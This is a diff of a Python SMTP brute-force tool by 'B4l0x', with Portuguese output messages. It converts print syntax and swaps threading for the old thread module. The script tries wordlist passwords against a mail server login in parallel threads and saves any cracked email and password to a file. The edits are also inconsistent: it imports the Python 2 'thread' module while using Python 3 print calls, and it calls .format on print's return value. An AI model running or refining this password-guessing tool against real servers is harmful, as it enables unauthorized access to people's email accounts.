@@ -5,10 +5,10 @@ import time
 import sys
 import argparse as arg
 import os
-import threading
+import thread
 
 def banner():
-  print '''
+  print("""
     ____             __          ______                        _____ __  _____________ 
    / __ )_______  __/ /____     / ____/___  _____________     / ___//  |/  /_  __/ __ \
 
@@ -16,7 +16,7 @@ def banner():
  / /_/ / /  / /_/ / /_/  __/  / __/ / /_/ / /  / /__/  __/   ___/ / /  / / / / / ____/ 
 /_____/_/   \__,_/\__/\___/  /_/    \____/_/   \___/\___/   /____/_/  /_/ /_/ /_/      
    V1.0 Criado por B4l0x - 14/05/2019
-  '''
+  """)
 banner()
 
 parser = arg.ArgumentParser(description="SMTP brute force by B4l0x")
@@ -31,6 +31,9 @@ porta = x.porta
 server = x.host
 tempo = time.strftime("%H:%M:%S")
 
+def backspace(n):
+    sys.stdout.write((b'\x08' * n).decode()) # use \x08 char to go back
+    
 def brute(i):
   ii = i.replace("\n", "")
   smptserver = smtplib.SMTP(server, porta)
@@ -40,26 +43,34 @@ def brute(i):
   
   try:
     smptserver.login(user, ii)
-    print "\n\t[{} INFO] Pwned: {}:{}\n\n".format(tempo, user, ii)
+    print("\n\t[{} INFO] Pwned: {}:{}\n\n".format(tempo, user, ii))
     arq = open("pwned-email.txt", "w")
     arq.write("Email: {} Senha: {}".format(user, ii))
     arq.close()
   except smtplib.SMTPAuthenticationError:
-    print "[{} INFO] Incorreta: {}:{}".format(tempo, user, ii)
-              
+    alocthread.acquire()
+    string = str("[{} INFO] Incorreta: {}:{}".format(tempo, user, ii))
+    sys.stdout.write(string)
+    sys.stdout.flush()
+    backspace(len(string))
+    alocthread.release()
+    
+alocthread = thread.allocate_lock()
+
 def iniciar():
   try:
     try:
       wordlist = open(x.wordlist, 'r').readlines()
     except:
-      print("[{} INFO] Verifique o caminho da wordlist e tente novamente...").format(tempo)
+      print("\n[{} INFO] Verifique o caminho da wordlist e tente novamente...").format(tempo)
       exit()
     for i in wordlist:
-      time.sleep(0.2)
-      t1 = threading.Thread(target=brute, args=(i,))
-      t1.start()
+      time.sleep(0.4)
+      thread.start_new_thread(brute, (i,))
+    print("\n\n\t[{} INFO] Fim do teste, obrigado por usar by B4l0x...\n").format(tempo)
+    thread.exit()
   except KeyboardInterrupt:
-    print("\n\t[{} INFO] Aguarde o script ser finalizado, obrigado por usar by B4l0x...\n").format(tempo)
+    print("\n\n\t[{} INFO] Aguarde o script ser finalizado, obrigado por usar by B4l0x...\n").format(tempo)
     exit()
     
 try:
@@ -72,5 +83,5 @@ except smtplib.SMTPAuthenticationError:
   print("[+] Iniciando brute force\n")
   iniciar()
 except:
-  print "[!] Verifique servidor e porta e tente novamente, host sem resposta"
+  print("\n[!] Verifique servidor e porta e tente novamente, host sem resposta")
   exit()
